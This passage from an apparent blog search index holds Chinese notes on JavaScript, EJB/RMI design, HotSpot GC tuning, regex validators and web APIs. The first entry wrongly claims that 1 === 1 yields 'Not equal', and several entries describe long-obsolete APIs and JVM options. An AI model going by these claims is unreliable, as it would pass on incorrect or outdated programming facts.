      "content": "javascript中== 和 ===都表示逻辑等，不同的是: ==在做逻辑等时，先进行类型转换。 ===则不会。 如下例：   &lt;script language=javascript&gt;  var valueA = 1;  var valueB = 1;  if ( valueA == valueB) {  alert(Equal);  }  else {   alert(Not equal)  }  //output: Equal  if ( valueA === valueB) {   alert(Equal);  }  else {   alert(Not equal)  }  //output: Not equal &lt;/script&gt;   ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-156/"
    } ,
  
    {
      "title"    : "EJB",
      "category" : "iteye",
      "content": "针对session EJB的应用，原因有二： Remote Session EJB的分布式功能（包括分布式事务传播） 即使只用Home EJB，也可以利用它的声明式事务功能 ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-157/"
    } ,
  
    {
      "title"    : "方法中的异常声明属于方法签名吗？",
      "category" : "iteye",
      "content": " 异常是方法执行完后才抛出的，跟返回结果相似，从这个角度来说不应该是方法签名的一部分。我们知道，如果根据不同的返回类型来区别签名从而达到重载的目的是不允许的，因为方法在没有返回前系统是不知道该选择哪个方法来执行的。Java中也不允许仅仅异常声明不一样的方法进行重载。   异常在接口实现，方法继承中只能变的越来越少（变窄）。也即父类异常声明必须包括(或者说是子类异常的父类）子类异常声明。这个可以这么理解，因为我们都是面向接口或者超类编程，客户端代码一定捕获的是接口或者超类中声明的异常。这样不管具体实现类中抛出什么样的异常，对客户端代码中的try，catch结构不会有任何影响。相反如果具体类中抛出一个接口中没有的异常，客户端的代码（catch语句）就要必须做出改变，这也就破坏了我们面向接口编程的初衷了。而Core Java中异常的处理正是按照继承或接口实现时异常变窄来实现的。     针对实现接口时方法声明中异常变窄的性质。RMI和EJB中有一个设计的模式可以参考。 我们知道，RMI中需要声明一个远程接口，每个暴露出来的方法需要抛出java.rmi.RemoteException,远程接口需要继承java.rmi.Remote接口。对于客户端调用来说对于这么RemoteException基本上是无能为力的，相反写起代码起来比较麻烦。 一种思路是对应远程接口声明一个业务接口，该业务接口中不包括Remote,RemoteException声明。服务端RMI实现时一个改变是需要同时实现远程接口和业务接口。对于客户端来说跟以前一样，只是根据Naming找到对象以后转化为业务接口操作即可。当然如果需要处理RemoteException的话那么把取出来的对象转化为远程接口接口即可。     ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-158/"
    } ,
  
    {
      "title"    : "SLSB的业务接口",
      "category" : "iteye",
      "content": "今天在看EJB的相关知识时回忆起以前SLSB中业务接口的设计。 声明一个业务接口继承自java.rmi.Remote接口（BTW,这是一个Marker interface). 该接口中声明所有业务需要的远程方法。EJB实现类实现这个业务接口即可，不需要直接实现java.rmi.Remote   该方案目的有二： 抽象出一个公共的业务接口并强迫EJB实现（编译时检查） 解耦EJB中多余的接口声明。当然注意的是业务接口中的方法还是需要抛出java.rmi.RemoteException的，要不EJB实现类没法实现.(参考实现时接口变窄的思想） ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-159/"
    } ,
  
    {
      "title"    : "来自EJB的回忆",
      "category" : "iteye",
      "content": "在EJB开发过程中，根据JNDI找到Home接口再生成远程接口对象是一个耗费资源的事。因为在很多遗留的EJB系统中有很多Cache的方案。一部分是Cache Home接口，一部分Cache  远程接口对象。怎么理解这两种方案的区别呢？ 答案是SFSB时Cache Home; SLSB时Cache 远程接口对象。因为SFSB只能跟Client的一次Session关联，多个Client不能重用（也即一次性的）。相反SLSB可以从Pool中直接重用。   此方案一般用在ServiceLocator中，ServiceLocator用来隔离web层和业务层，避免web层直接接触Ejb home等接口。   经典方案是在web层中多出一层Business Interface+ Business Delegate，Business Delegate实现类中通过ServiceLocator找到远程对象。 ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-160/"
    } ,
  
    {
      "title"    : "JAX-RPC之WSDL",
      "category" : "iteye",
      "content": " javax.xml.rpc.Service &lt;------------------&gt; WSDL中的 service   从jndi(J2EE)或者Service Factory(J2SE)中获取service以后   myService.getPort  &lt;----------------------&gt; WSDL中的port port 才是真正的对应一个service接口，也即SEI(Servie Endpoint Interface)   一个SEI例子如下： public interface MyPort extends java.rmi.Remote { String doSomething(int someParam) throws java.rmi.RemoteException; } SEI可以手写或者用工具从WSDL中生成。   ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-161/"
    } ,
  
    {
      "title"    : "java中的动态代理",
      "category" : "iteye",
      "content": "jdk中动态代理只支持接口的方式   实现方式是：   调用 java.lang.reflect.Proxy中的静态方法     newProxyInstance(ClassLoader loader,                                       Class[] interfaces,                                       InvocationHandler h) loader和interfaces是被代理类的   针对返回的对象转型为被代理类的接口   2. 实现一个java.lang.reflect.InvocationHandler 接口，实现其中的方法   &gt;public Object invoke(Object proxy,                      Method method, Object[] args) 此处关键是需要传入具体类作为此实现类的实例变量，  并保证以以下方式调用，并在该方法调用前后加入需要代理的逻辑   &gt;method.invoke(被代理类实例，args);   ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-162/"
    } ,
  
    {
      "title"    : "多线程同步",
      "category" : "iteye",
      "content": " synchronized语句     同步的代码块尽量少     locks split, 私有的对象锁代替this   volatile for double, long primitive type.   ThreadLocal   使用 JDK1.5提供的锁  java.util.concurrent.locks.Lock,   java.util.concurrent.locks.ReadWriteLock   ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-163/"
    } ,
  
    {
      "title"    : "我眼中的LLD",
      "category" : "iteye",
      "content": "LLD一般与Functional Specification 和 HLD对应。包括： Purpose,  Intended/Target Audience   Data Model 必要的UML图 Logging处理 Exception 处理 Security处理 Transaction处理 Assumption Dependencies/Third Party Jar External Interfaces Limitation ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-165/"
    } ,
  
    {
      "title"    : "use case in Functional Specification",
      "category" : "iteye",
      "content": "一种可行的描述use case的方法是： 列表显示Normal Flow:如1，2，etc   列表显示Alternative Flow，注意需要对应（借助）与Normal Flow.并且前面加一个前缀A.以区别。比如Normal Flow的Step 2有Alternative Flow的话，称为A.2.1, A.2.2直至该Flow结束   列表显示Exception Flow，注意需要对应（借助）与Normal Flow和Alternative Flow.并且前面加一个前缀E.以区别。比如E1.1, E.A.2.1.1,etc.   其他可选的包括 data requirement ( 页面字段描述，包括是否mandatory ) 和 Error Message描述。 ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-166/"
    } ,
  
    {
      "title"    : "Java GC 策略",
      "category" : "iteye",
      "content": "Sun Hotspot JVM的GC策略是分代： Yong Generation: Eden, Survior1, Survivor2  Scavenge GC, Copy算法，GC频繁   Old（Tenured) Generation  会引起Full GC, 尽可能减少Full GC次数.一般采用CMS(Concurrency-Mark-Sweep, C is not referening to Compact)算法   Permanent Generation     会引起Full GC, 尽可能减少Full GC次数     通过 -XX:PermSize= -XX:MaxPermSize=  设置    permanent Generation Space 保存Class,Method等MetaData信息，与Heap不同,Sun JVM默认64M。   注： GC调优中平衡throughput和pause time两个指标, Server 和 Client JVM会有不同的考量(HotSpot中） new,old space 调优 new space一般占25～40%，如果Stateless对象比较多的话可以考虑多分配一点；相反如果stateful对象比较多，可以多分配一点old space     java 启动命令行中加入 -verbose:gc 来measure 当前GC 性能     [GC 325407K-&gt;83000K(776768K), 0.2300771 secs] [GC 325816K-&gt;83372K(776768K), 0.2454258 secs] [Full GC 267628K-&gt;83769K(776768K), 1.8479984 secs]     325407K和83000K是Minor GC前后Yong GenerationHeap大小   776768K  is the committed size of the heap: the amount of space usable for java objects without requesting more memory from the operating system. Note that this number does not include one of the survivor spaces, since only one can be used at any given time, and also does not include the permanent generation, which holds metadata used by the virtual machine. 我的理解是young 和old generation当前之和除去一个survivor区和permanent区的大小。当前young Generation的大小是逐步增大的，介于xms和xmx之间。   -XX:+PrintGCDetails 参数输出的GC log格式会有不同     [GC [DefNew: 64575K-&gt;959K(64576K), 0.0457646 secs] 196016K-&gt;133633K(261184K), 0.0459067 secs]   indicates that the minor collection recovered about 98% of the young generation, DefNew: 64575K-&gt;959K(64576K) and took 0.0457646 secs (about 45 milliseconds).   The usage of the entire heap was reduced to about 51% 196016K-&gt;133633K(261184K) and that there was some slight additional overhead for the collection (over and above the collection of the young generation) as indicated by the final time of 0.0459067 secs.     -XX:NewRatio=3 means that the ratio between the young and tenured generation is 1:3. In other words, the combined size of the eden and survivor spaces will be one fourth of the total heap size.   6. -XX:SurvivorRatio=6   sets the ratio between a survivor space and eden  to 1:6. In other words, each survivor space will be one sixth the size of eden, and thus one eighth the size of the young generation (not one seventh, because there are two survivor spaces). ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-167/"
    } ,
  
    {
      "title"    : "事务之CAP/BASE",
      "category" : "iteye",
      "content": "CAP理论： Consistency Availability Tolerance of  network partition 一般来说，分区容忍性( partition Tolerance )是网站可伸缩性必需的，因此只能在Consistency和Availability之间做出取舍。   Base： Basically Available Soft state Eventually Consistent. ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-168/"
    } ,
  
    {
      "title"    : "4+1架构",
      "category" : "iteye",
      "content": "为了从不同stake holder的角度来看架构，架构设计文档从多个角度来说明   Logical View 关注 FS Process View 关注 Non-FS Implementation View 关注组件，层次实现及具体关系 Data View 关注数据持久化   中心是 Use Case View 描述关键业务流程 ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-169/"
    } ,
  
    {
      "title"    : "一个金融系统考虑到的",
      "category" : "iteye",
      "content": " 为了安全起见，所有的写操作都要计入Audit表中 考虑效率（reconciliation&amp;settlement)，引入影子表（这是一个实表，非虚表）. 影子表是对多个业务相关表的数据冗余。 数据库表设计时留了一些字段,并不表示任何业务意义，仅仅是为了以后扩充。虽丑陋但实用，能解决部分问题。 表结构设计时不设主键外键，提高性能？ Portal支持SSL 逻辑删除表记录，如结算，对账中用到的帐号信息。 7. 虽然是BS结构的网站，从网络层面配置可访问的IP地址--白名单。 8. 系统自己定义一些业务规则并在payment流程中验证这些规则。 现在很多网上支付系统加入了短信验证码的机制 ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-170/"
    } ,
  
    {
      "title"    : "Enterprise Integration Pattern读中感",
      "category" : "iteye",
      "content": "最近在拜读Martin Fowler的Enterprise Integration Pattern，对于基于消息系统的应用集成了解了不少。虽然以前的工作也涉及IBM MQ但体会总是不是很深。在不同应用，分布式环境中的集成中，消息中间件在可靠性方面是优势。 这跟我的第一印象是刚好相反的，以前总以为消息总会如同发出的信件一下，也许会石沉大海吧？哪有同步方式，比如打电话，可靠？仔细一想，其实不然。同步方式在分布式应用中依赖太多，通讯双方同时在线，网络可靠，load安全（不要被太多的Request压死了）等。 这些方面消息中间件却是优势。同时消息中间件解耦了消息生产者和消费者。发送消息和接收消息的系统只要跟消息中间件打交道。   记得以前有个项目中自己实现了个消息系统，J2SE中多个应用之间通过消息通讯。主要是通过RMI和Observer模式实现。回想起来也算是分布式消息系统吧？不同的是发送方和接受方是耦合的。比如发送方（subject）维护了一个接受方的listener list(RMI 回调接口），发送消息时轮询list并RMI回调接口。   再回想起以前被面的时候，一个经理跟我谈到SOA时，不停的challenge我项目中SOA框架有啥好处。他的意思是他现在项目中用JSP，Servlet分层用的很好啊。然后我就从loosely coupling, reuse等角度来讲这个问题。SOA框架给我们解耦了Service的集成（通过ESB )。如同Spring封装了对象的创建和维护消除我们在自己程序中通过Factory，Singleton来创建对象，框架帮我们做了这部分工作。 ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-172/"
    } ,
  
    {
      "title"    : "性能调优",
      "category" : "iteye",
      "content": "堆栈参数调整(基于 Sun Hotspot ) -Xss:设置任何线程的本地方法栈大小 -Xms:设置JVM初始堆大小 -Xmx:设置JVM最大堆大小 -XX:PermSize=:设置JVM Perm generation的初始大小 -XX:MaxPermSize=:设置JVM Perm Generation的最大大小   注意：所有以-X开头的JVM参数都不是标准参数（未包含在JVM规范中），即可能不会被所有版本的JVM实现；以-XX开头的JVM参数可能指定了特定的系统平台，且可能在没有通知的情况下更改，因此不推荐使用。   通过jdk5 自带的JConsole查看是否有memory leak 先以下面的方式启动需要调优的目标程序JVM cd  C:  Program Files  Java  jdk1.6.0_21  demo  jfc  SwingSet2 java -Dcom.sun.management.jmxremote -Djava.rmi.server.hostname=localhost -jar SwingSet2.jar 打开JConsole(JDK5)/JVisualVM(JDK6)以本地进程方式连接目标进程.查看memory, classes, thread,CPU情况。   注意在我Vista机器上 必须加上 -Djava.rmi.server.hostname=localhost 才能连接，否则报“连接失败，是否重试”的错误。   查看heap中的主要对象，用jmap 可以查看histogram   查看对象的reachable jhat       ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-174/"
    } ,
  
    {
      "title"    : "XmlHttpRequest AJAX限制",
      "category" : "iteye",
      "content": " SOP(Same Orgin Policy)限制 这个主要通过 JSONP(padding)解决，当然server proxy, iframe也是可选的方案   file upload IFrame是一种方案，其他可选的有Applet, Flash 插件方案。   Backward/Forward/收藏夹       不是很清楚解决方案，记得曾看到过有通过同一个页面加锚点的方案，不是很理解。 ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-175/"
    } ,
  
    {
      "title"    : "Web Service 如何限制接口的调用",
      "category" : "iteye",
      "content": " 加入WS-Security Policy？   在Web Service 前加入网关安全过滤？   在soap header 中加入user id/caller id, org id/name 的信息。当然别人也可以仿造 ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-176/"
    } ,
  
    {
      "title"    : "Websphere Portal 用户管理",
      "category" : "iteye",
      "content": "通过下面的调用链 PUMA接口 Portal,portlets PUMA (Portal User Management Architecture) WMM (Websphere Member Manager)   最终WMM.xml中会配置LDAP连接的信息，从而关联portal server和LDAP server ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-177/"
    } ,
  
    {
      "title"    : "数据库众生相",
      "category" : "iteye",
      "content": " 关系数据库 基于严格的关系数据库理论，但面对现有电子商务，SNS网站业务的挑战，Scalability和Performance不能很好地解决   Key-Value数据库 No SQL数据库如google的Big Table. 解决了关系数据库的不足，但基于Key取值，并不能如同SQL一般进行查询。因为数据都是非结构化，离散的。   面向文档的数据库 如：MongoDB，支持查询   图形数据库 据说已有厂家产品支持节点和边的图形数据库 ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-178/"
    } ,
  
    {
      "title"    : "HotSpot GC",
      "category" : "iteye",
      "content": "按代的垃圾收集机制, 主要分为三种：   复制算法，空间被分为等大的两块，从根开始访问每一个关联的活跃对象，将空间 A 的活跃对象全部复制到空间 B，然后一次性回收整个空间 A，优点：只访问活跃对象，将所有活动对象复制走之后就清空整个空间，不用去访问死对象，所以遍历空间的成本较小，缺点：需要巨大的复制成本和较多的内存； 标记清除算法，从根开始访问所有活跃对象，标记为活跃对象。然后再遍历一次整个内存区域，把所有没有标记活跃的对象进行回收处理，优点：不需要额外的空间，缺点：较长的 GC 暂停时间，较大的扫描时间开销，产生较多的空间碎片； 标记清除整理算法，综合上两种算法的优点，先标记活跃对象，然后将其合并成较大的内存块。   代的划分： 年轻代：新创建的对象分配在此，研究表明，大部分程序所产生的对象都在此消亡，几乎所有的收集器为年轻代使用复制算法，年轻代又被划分为 1个伊甸园区(Eden)和 2个存活区(Survivor)用来实施复制算法； 也称Minor Collection，基于大多数对象Die Young的原则 年老代(Tenured)：从年轻代存活下来的对象被复制到年老代，主要实施标记清除或标记清除整理算法；也称Major Collection， Full GC. 该过程会比较慢因为会遍历所有的Live 对象。 持久代(Permanent)：装载的类数据和方法存储于此，无可消亡对象。     基于JVM层的性能调优思路大概是： 对程序进行profiling, 主要考虑方法调用过程，花费的时间等 dump出heap或者实时监控分析 对象大小，引用关系 启动Java程序时打开 -verbose:gc, 分析GC执行情况，执行前后Heap中对象在图上显示有什么pattern（如果有图形显示的工具的话）   根据分析结果检查线程，死锁，内存泄漏的蛛丝马迹。最后可以考虑对JVM启动参数进行调整，这个会改变GC的算法及内存（heap）分配情况    单处理器时基本是基于Generation的Copy算法或者Mark-Sweep-Compact算法；多处理器时考虑并行GC因此可以指定更多的GC策略，一个处理器做GC，另一个继续运行Applicaiton。这样不用象单处理器一样GC时Applicaiton Pause住。       ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-179/"
    } ,
  
    {
      "title"    : "HotSpot GC及参数设置",
      "category" : "iteye",
      "content": "JVM参数调整无非是调整堆中各种内存的大小，选择最优的GC算法（行为）。一般有两个指标来考量： Pause时间 Throughput   GC类型有： Serial GC The serial collector uses a single thread to perform all garbage collection work, which makes it relatively efficient since there is no communication overhead between threads. It is best-suited to single processor machines, since it cannot take advantage of multiprocessor hardware, although it can be useful on multiprocessors for applications with small data sets (up to approximately 100MB). The serial collector is selected by default on certain hardware and operating system configurations, or can be explicitly enabled with the option -XX:+UseSerialGC The Throughput Collector   -XX:+UseParallelGC主要是针对young generation的，Tenured Generation还是Serial Collector   The parallel collector (also known as the throughput collector) performs minor collections in parallel, which can significantly reduce garbage collection overhead. It is intended for applications with medium- to large-sized data sets that are run on multiprocessor or multi-threaded hardware. The parallel collector is selected by default on certain hardware and operating system configurations, or can be explicitly enabled with the option -XX:+UseParallelGC. New: parallel compaction is a feature introduced in J2SE 5.0 update 6 and enhanced in Java SE 6 that allows the parallel collector to perform major collections in parallel. Without parallel compaction, major collections are performed using a single thread, which can significantly limit scalability. Parallel compaction is enabled by adding the option -XX:+UseParallelOldGC to the command line     The Concurrent Low Pause Collector       -Xincgc or  -XX:+UseConcMarkSweepGC 主要是正对Tenure Generation的   The concurrent collector performs most of its work concurrently (i.e., while the application is still running) to keep garbage collection pauses short. It is designed for applications with medium- to large-sized data sets for which response time is more important than overall throughput, since the techniques used to minimize pauses can reduce application performance. The concurrent collector is enabled with the option -XX:+UseConcMarkSweepGC.   The Incremental Low Pause Collector        -XX:+UseTrainGC     下面介绍一下各种参数的意义 -Xms  -Xmx      Heap 内存设置      堆内存不是一下子就分配-Xmx大小的，随着GC的进行，从-Xms慢慢递增的      基本来说Heap内存分配太大的话，GC的次数会减少，但是做一次GC的Pause时间会很大。反之亦然。   + -Xincgc       Incremental GC,也即GC的Train算法,  增量GC一次只收集部分Heap对象，而不是针对整个堆。如果GC Pause 时间太长的话可以考虑用这个选项调试一下   -Xss       栈大小设置，从Java6开始，32-bit JVM默认是320k，64-bit JVM默认是1024k。（题外话，64-bit JVM并不会所有类型double一下，只是可分配的Heap内存和线程数会更多）       注意栈大小设置太小的话，递归多的话会出现栈溢出；栈太大的话，如果Application中线程比较多（每个线程有自己的栈），可分配的栈变少，就会出现 running out of memeory问题。 Server 和 Client端GC策略不同，考虑到可用的Heap Size,CPU数量等。 ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-180/"
    } ,
  
    {
      "title"    : "Java正则表达式",
      "category" : "iteye",
      "content": "转自：http://hi.baidu.com/xu_yunan/blog/item/7ce5d93bb279d22c96ddd843.html 各种正则表达式实例 用户名 ^[a-z0-9_-]{3,15}$ ^     # 行开始 [a-z0-9_-]   # 匹配列表中的字符，a-z,0–9,下划线，连字符 {3,15}    # 长度至少3个字符，最大长度为15 $     # 行结束 密码 ((?=.*  d)(?=.*[a-z])(?=.*[A-Z])(?=.*[@#$%]).{6,20}) (    # 组开始 (?=.*  d)    # 必须包含一个数字 0-9 (?=.*[a-z])   # 必须包含一个小写字符 (?=.*[A-Z])   # 必须包含一个大写字符 (?=.*[@#$%])   # 必须包含一个列表中的特殊字符&quot;@#$%&quot; .    # 检查所有字符串与前面的条件的匹配 {6,20}    # 长度至少为6个字符，最大长度为20 )    # 组结束 16进制颜色 ^#([A-Fa-f0-9]{6}|[A-Fa-f0-9]{3})$ ^     # 行开始 #     # 必须包含一个&quot;#&quot;符号 (     # 组#1开始 [A-Fa-f0-9]{6}  # 列表中的任意字符串,长度为6 |     # 或者 [A-Fa-f0-9]{3}  # 列表中的任意字符串,长度为3 )     # 组#1结束 $     # 行结束 Email ^[_A-Za-z0-9-]+(    .[_A-Za-z0-9-]+)*@[A-Za-z0-9]+(    .[A-Za-z0-9]+)*(    .[A-Za-z]{2,})$ ^     # 行开始 [_A-Za-z0-9-]+   # 必须以中括号中的字符为起始字符[],必须包含一个或多个(+) (     # 组#1开始     .[_A-Za-z0-9-]+  # 接下来是一个点&quot;.&quot;和中括号内的字符[],必须包含一个或者多个(+) )*     # 组#1结束, 这个组是可选的(*) @     # 必须包含一个&quot;@&quot;符号 [A-Za-z0-9]+    # 接下来是中括号内的字符[],必须包含一个或者多个(+) (     # 组 #2开始 – 一级TLD检查     .[A-Za-z0-9]+   # 接下来是一个点&quot;.&quot;和中括号内的字符[],必须包含一个或者多个(+) )*     # 组#2结束,这个组是可选的(*) (     # 组#3开始 – 二级TLD检查     .[A-Za-z]{2,}   # 接下来是一个点&quot;.&quot;和中括号内的字符[], 最小长度为2 )     # 组#3结束 $     # 行结束 图像文件 ([^  s]+(  .(?i)(jpg|png|gif|bmp))$) (     # 组#1开始 [^  s]+    # 必须包含一个或更多的任意字符(除了空格) (     # 组#2开始   .    # 接下来是一个点&quot;.&quot; (?i)    # 忽略后边字符的大小写检查   (  # 组#3开始   jpg  #   包含字符&quot;jpg&quot;   |   #   ..或者   png  #   包含字符&quot;png&quot;   |   #   .. 或者   gif  #   包含字符&quot;gif&quot;   |   #   .. 或者   bmp  #   包含字符&quot;bmp&quot;   )  #  组#3结束  )   #  组#2结束 $    # 字符串的结束 )     # 组#1结束 补充一个：[  s  S]?([^    /]?  .jpg) IP地址 ^([01]?    d    d?|2[0-4]    d|25[0-5])    .([01]?    d    d?|2[0-4]    d|25[0-5])    .([01]?    d    d?|2[0-4]    d|25[0-5])    .([01]?    d    d?|2[0-4]    d|25[0-5])$ ^   # 行开始 (    # 组#1开始 [01]?    d    d?  #  可以是1到2个数字. 如果出现3个数字, 必须以0或者1开始    #  例如 ([0-9], [0-9][0-9],[0-1][0-9][0-9])  |   #  ...或者 2[0-4]    d  #  以2开始, 紧跟着是0-4，并且以任意数字结尾(2[0-4][0-9]) |   #  ...或者 25[0-5]  #  以2开始, 紧跟着是5，并且以0-5结尾 (25[0-5]) )    # 组#1结束   .   # 接下来是点&quot;.&quot; ....   # 重复3次 (3x) $   # 行结束 12-小时制时间 (1[012]|[1-9]):[0-5][0-9](    s)?(?i)(am|pm) (      # 组#1开始 1[012]     # 以10, 11, 12开始 |      # 或者 [1-9]      # 以1,2,...9开始 )      # 组#1结束 :      # 接下来是一个冒号 (:) [0-5][0-9]     #  接下来是0..5和0..9,意思是00到59   (    s)?    #  接下来是一个空格(可选)    (?i)   #  下面的检查不区分大小写     (am|pm) #   接下来是AM或者PM 24小时制时间正则表达式模式 ([01]?[0-9]|2[0-3]):[0-5][0-9] (      # 组#1开始 [01]?[0-9]    # 以0-9,1-9,00-09,10-19开始 |      # 或者 2[0-3]     # 以20-23开始 )      # 组#1结束 :      # 接下来是一个冒号(:) [0-5][0-9]     #  接下来是0..5和0..9,意思是00到59 日期格式 (dd/mm/yyyy) 正则表达式模式 (0?[1-9]|[12][0-9]|3[01])/(0?[1-9]|1[012])/((19|20)    d    d) (     # 组#1开始 0?[1-9]    # 01-09或者1-9 |     # ..或者 [12][0-9]    # 10-19或者20-29 |     # ..或者 3[01]    # 30, 31 )     # 组#1结束 /    # 接下来是一个&quot;/&quot; (     #  组#2开始  0?[1-9]   #  01-09或者1-9  |    #  ..或者  1[012]    #  10,11,12  )    #  组#2结束 /    #  接下来是一个&quot;/&quot;  (    #  组#3开始  (19|20)    d    d  #   19[0-9][0-9]或者20[0-9][0-9]  )    #  组#3结束 HTML标签 &lt;(&quot;[^&quot;]*&quot;|'[^']*'|[^'&quot;&gt;])*&gt; &lt;   # 以&quot;&lt;&quot;标签开始 (   # 组#1开始 &quot;[^&quot;]*&quot;  #  只允许两个双引号成对出现-&quot;string&quot; |   #  ..或者 '[^']*'  #  只允许两个单引号成对出现- 'string' |   #  ..或者 [^'&quot;&gt;]  #  不能出现单独的双引号、单引号和&quot;&gt;&quot; )   # 组#1结束 *   # 0次或多次 &gt;   # 以结束标签&quot;&gt;&quot;结束 HTML中的A标签正则表达式模式 (?i)&lt;a([^&gt;]+)&gt;(.+?) (              # 组#1开始 ?i            #   所有的检查区分大小写 )              # 组#1结束 &lt;a             # 以&quot;&lt;a&quot;开始 (            # 组#2开始 [^&gt;]+       # 除了(&quot;&gt;&quot;)之外的任意字符,至少一个字符 )            # 组#2结束 &gt;            #     接下来是&quot;&gt;&quot; (.+?)       #       匹配所有 &lt;/a&gt;    #         以&quot;&lt;/a&gt;结束 提取HTML链接正则表达式模式   s*(?i)href  s*=  s*(  &quot;([^&quot;]*  &quot;)|'[^']*'|([^'&quot;&gt;  s]+));   s*                          # 可以以空格开始 (?i)                       #   所有的检查是区分大小写的 href                    #     接下来是一个&quot;href&quot;字    s*=  s*              #       等号两边都允许空格,   (              #         组#1开始   &quot;([^&quot;]*&quot;)     #           只允许2个双引号成对出现 - &quot;string&quot;   |             #           ..或者   '[^']*'       #           只允许2个单引号成对出现 - 'string'   |             #           ..或者   ([^'&quot;&gt;]+)  #           或者不允许出现单独的单引号、双引号和&quot;&gt;&quot;   )             #         组#1结束 ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-181/"
    } ,
  
    {
      "title"    : "escape() encodeURI() encodeURIComponent",
      "category" : "iteye",
      "content": "这是Javascript中的三个对URL进行编码的方法，区别如下：   escape() 采用ISO Latin字符集对指定的字符串进行编码。所有的空格符、标点符号、特殊字符以及其他非ASCII字符都将被转化成%xx格式的字符编码（xx等于该字符在字符集表里面的编码的16进制数字）。比如，空格符对应的编码是%20。unescape方法与此相反。不会被此方法编码的字符： @ * / + encodeURL       把URI字符串采用UTF-8编码格式转化成escape格式的字符串。不会被此方法编码的字符：! @ # $&amp; * ( ) = : / ; ? + '. 比如Wiktionary:Word of the day/October 21          会被编码成：Wiktionary:Word%20of%20the%20day/October%2021.这也是网络上基于Web的service接口（不一定是SOAP Web Service接口）所要求的调用接口，比如： http://en.wiktionary.org/w/api.php?action=query&amp;prop=revisions&amp;titles=Wiktionary:Word%20of%20the%20day/October%2021&amp;rvprop=content&amp;format=xml encodeURLComponent       把URI字符串采用UTF-8编码格式转化成escape格式的字符串。与encodeURI()相比，这个方法将对更多的字符进行编码，比如 / 等字符。所以如果字符串里面包含了URI的几个部分的话，不能用这个方法来进行编码，否则 / 字符被编码之后URL将显示错误。不会被此方法编码的字符：! * ( )  ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-182/"
    } ,
  
    {
      "title"    : "基于Web 的Service接口",
      "category" : "iteye",
      "content": "目前网络上有一些基于Web发布的Service接口，此处不一定特指基于SOAP的Web Service接口。大多时候我更喜欢暴露出一个URL，开发者传入查询参数返回XML或者jason数据的接口。比如：   Wiki接口   http://en.wiktionary.org/w/api.php?action=query&amp;prop=revisions&amp;titles=%s&amp;rvprop=content&amp;format=json   此处titles参数可以是任何Word，一个特殊的格式返回某天的特定单词是 Wiktionary:Word of the day/October 26 需要注意的是调用是需要通过Javascript的encodeURI或者encodeURLComponent进行编码。Wiktionary:Word of the day/October 26编码成以下两种都可以 encodeURL: Wiktionary:Word%20of%20the%20day/October%2021 encodeURLComponent: Wiktionary%3AWord+of+the+day%2FOctober+21     Google 天气   http://www.google.com/ig/api?weather=%s&amp;hl=zh-cn 中国地区，weather参数可以是城市的拼音。如上海未来三天的天气预报： http://www.google.com/ig/api?weather=shanghai&amp;hl=zh-cn     Yahoo 财经（股票数据） 返回的是CSV格式的。http://download.finance.yahoo.com/d/quotes.csv?f=sl1d1t1ohgv&amp;e=.csv&amp;s=IBM,NOK,HMC   Wikipedia   需要解析返回的网页文件（右侧的信息框，是一些三元组），不是直接的Web service接口 http://en.wikipedia.org/wiki/Nokia返回的是网页，三元组形式http://dbpedia.org/page/Nokia   Google Reader RSS export   https://www.google.com/reader/atom/feed/http://echohfut.iteye.com/rss?n=150  URL 中feed后面可以是其他RSS URL ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-183/"
    } ,
  
    {
      "title"    : "如何避免两个对象的相互引用引起的堆栈溢出",
      "category" : "iteye",
      "content": "两个对象相互引用，并且这种引用关系定义在构造函数中时，初始化这种对象会引起堆栈溢出。因为对象1的初始化调用了对象2的初始化，反之亦然。这样会构成死循环。解决方法是用一个无参数的构造函数代替。对象的引用依赖关系通过Set方法在对象初始化之后设置进去。当然一个缺点是需要注意无参数构造函数生成的对象是一个不完整的对象。 ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-186/"
    } ,
  
    {
      "title"    : "windows下有用命令",
      "category" : "iteye",
      "content": " perfMon 图形显示CPU，内存，磁盘/网络 I/O使用情况 类似于Linux平台下的ps/top命令         ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-188/"
    } ,
  
    {
      "title"    : "Javascript中的undefined 和 null",
      "category" : "iteye",
      "content": "undefined undefined 在Javascript中是数据类型也是值 有两种情况下变量的类型是undefined，即通过typeof 变量名查看。 未声明的变量 声明过了未赋值的变量     null null在Javascript中是数据类型也是值,但如果用 typeof null 看类新的话看到的是 object。null值不是系统默认赋值的，而是programmer手工在代码中赋值的。 ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-195/"
    } ,
  
    {
      "title"    : "JDK小知识",
      "category" : "iteye",
      "content": " java文件编译时可以通过指定 -source 1.4选择用JDK 1.4编译源文件。这在系统只装了JDK5或者6时比较有用。 ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-201/"
    } ,
  
    {
      "title"    : "Oracle索引",
      "category" : "iteye",
